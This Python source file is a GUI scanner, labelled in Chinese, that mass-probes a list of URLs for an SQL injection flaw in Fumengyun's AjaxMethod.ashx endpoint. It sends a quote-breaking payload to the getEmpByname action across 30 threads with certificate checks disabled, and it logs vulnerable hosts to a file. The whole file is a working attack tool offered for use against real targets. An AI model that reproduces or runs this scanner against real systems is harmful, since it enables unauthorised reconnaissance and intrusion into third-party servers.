import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def fumengyun_sql_exp(url):
    poc = r"""/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "字符串 'Y'' 后的引号不完整。" in res.text:
            fumengyun_sql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            fumengyun_sql_text.see(END)
            with open ("存在孚盟云 AjaxMethod.ashx SQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            fumengyun_sql_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            fumengyun_sql_text.see(END)
    except Exception as err:
        fumengyun_sql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        fumengyun_sql_text.see(END)
def get_fumengyun_sql_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def fumengyun_sql_gui():
    fumengyun_sql = tk.Tk()
    fumengyun_sql.geometry("910x450")
    fumengyun_sql.title("孚盟云 AjaxMethod.ashx SQL注入漏洞一把梭")
    fumengyun_sql.resizable(0, 0)
    fumengyun_sql.iconbitmap('logo.ico')
    global fumengyun_sql_text
    fumengyun_sql_text = scrolledtext.ScrolledText(fumengyun_sql,width=123, height=25)
    fumengyun_sql_text.grid(row=0, column=0, padx=10, pady=10)
    fumengyun_sql_text.see(END)
    addrs = get_fumengyun_sql_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(fumengyun_sql_exp, addr)
    fumengyun_sql.mainloop()